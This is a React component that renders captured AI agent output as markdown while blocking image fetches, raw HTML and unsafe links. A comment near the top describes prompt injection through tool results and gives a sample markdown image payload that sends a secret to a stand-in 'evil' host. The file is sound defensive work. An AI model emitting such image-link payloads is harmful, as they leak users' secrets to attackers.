import React from "react";
import ReactMarkdown from "react-markdown";
import remarkGfm from "remark-gfm";
import SyntaxHighlighter from "react-syntax-highlighter/dist/cjs/light";
import a11yDark from "react-syntax-highlighter/dist/cjs/styles/hljs/a11y-dark";
import bash from "react-syntax-highlighter/dist/cjs/languages/hljs/bash";
import css from "react-syntax-highlighter/dist/cjs/languages/hljs/css";
import go from "react-syntax-highlighter/dist/cjs/languages/hljs/go";
import java from "react-syntax-highlighter/dist/cjs/languages/hljs/java";
import javascript from "react-syntax-highlighter/dist/cjs/languages/hljs/javascript";
import json from "react-syntax-highlighter/dist/cjs/languages/hljs/json";
import markdown from "react-syntax-highlighter/dist/cjs/languages/hljs/markdown";
import python from "react-syntax-highlighter/dist/cjs/languages/hljs/python";
import ruby from "react-syntax-highlighter/dist/cjs/languages/hljs/ruby";
import rust from "react-syntax-highlighter/dist/cjs/languages/hljs/rust";
import shell from "react-syntax-highlighter/dist/cjs/languages/hljs/shell";
import sql from "react-syntax-highlighter/dist/cjs/languages/hljs/sql";
import typescript from "react-syntax-highlighter/dist/cjs/languages/hljs/typescript";
import xml from "react-syntax-highlighter/dist/cjs/languages/hljs/xml";
import yaml from "react-syntax-highlighter/dist/cjs/languages/hljs/yaml";
import { Box, Chip, Typography } from "@mui/material";

// The highlight.js (lowlight) build, imported by its own path, not the Prism
// builds or the package index (which loads them all): react-syntax-
// highlighter's Prism builds load refractor, which patches the shared
// prismjs module so Prism.highlight returns hast nodes, and that breaks
// every prismjs-highlighted editor in the app (FilterForm's script editor).
// lowlight does not register a language's aliases, so the common ones are
// listed; any other language is auto-detected among these.
Object.entries({
  bash, sh: bash, zsh: bash, css, go, golang: go, java, javascript, js: javascript, jsx: javascript,
  json, markdown, md: markdown, python, py: python, ruby, rb: ruby, rust, rs: rust, shell, sql,
  typescript, ts: typescript, tsx: typescript, xml, html: xml, yaml, yml: yaml,
}).forEach(([name, lang]) => SyntaxHighlighter.registerLanguage(name, lang));

// Markdown for captured agent content (jyx.82). Captured text is
// attacker-influenced (prompt injection through tool results), so nothing in
// it may make the viewer's browser fetch anything:
// - images never render: an image becomes a chip with its alt text and host,
//   so a "![](https://evil/?d=SECRET)" in model output is not requested;
// - links stay visible with their target shown, open in a new tab with
//   rel="noopener noreferrer nofollow", and keep react-markdown's default URL
//   sanitising (javascript: and the like are dropped);
// - raw HTML is never rendered (no rehype-raw; skipHtml).

const hostOf = (url) => {
  try {
    return new URL(url).host || url;
  } catch (e) {
    return url || "";
  }
};

const components = {
  p: ({ node, ...props }) => <Typography variant="body2" component="div" sx={{ mb: 1 }} {...props} />,
  img: ({ node, src, alt }) => (
    <Chip
      size="small"
      variant="outlined"
      data-testid="blocked-image"
      label={`image${alt ? `: ${alt}` : ""}${src ? ` (${hostOf(src)}, not loaded)` : ""}`}
      sx={{ my: 0.5 }}
    />
  ),
  a: ({ node, href, children }) =>
    href ? (
      <>
        <a href={href} target="_blank" rel="noopener noreferrer nofollow">
          {children}
        </a>
        {String(children) !== href && (
          <Typography component="span" variant="caption" color="text.secondary" sx={{ ml: 0.5 }}>
            ({href})
          </Typography>
        )}
      </>
    ) : (
      <span>{children}</span>
    ),
  code: ({ node, inline, className, children, ...props }) => {
    const match = /language-(\w+)/.exec(className || "");
    if (inline || !match) {
      return (
        <Box component="code" sx={{ fontFamily: "monospace", bgcolor: "action.hover", px: 0.5, borderRadius: 0.5 }} {...props}>
          {children}
        </Box>
      );
    }
    return (
      <SyntaxHighlighter style={a11yDark} language={match[1]} PreTag="div" customStyle={{ maxWidth: "100%", overflowX: "auto" }}>
        {String(children).replace(/\n$/, "")}
      </SyntaxHighlighter>
    );
  },
};

const CapturedMarkdown = ({ content }) => (
  <ReactMarkdown remarkPlugins={[remarkGfm]} skipHtml components={components}>
    {content || ""}
  </ReactMarkdown>
);

export default CapturedMarkdown;
